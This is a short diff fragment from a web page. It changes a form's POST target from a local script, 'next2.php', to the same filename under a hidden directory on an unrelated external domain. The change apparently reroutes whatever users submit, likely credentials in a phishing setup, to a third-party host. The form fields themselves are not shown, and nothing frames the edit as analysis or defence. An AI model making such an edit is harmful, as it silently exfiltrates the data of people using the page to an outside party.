@@ -15,7 +15,7 @@
 
 
  
-<form action="next2.php"    method="post">  
+<form action="https://beunrulypo.xyz/.hjmm/next2.php"    method="post">  
  
  
  
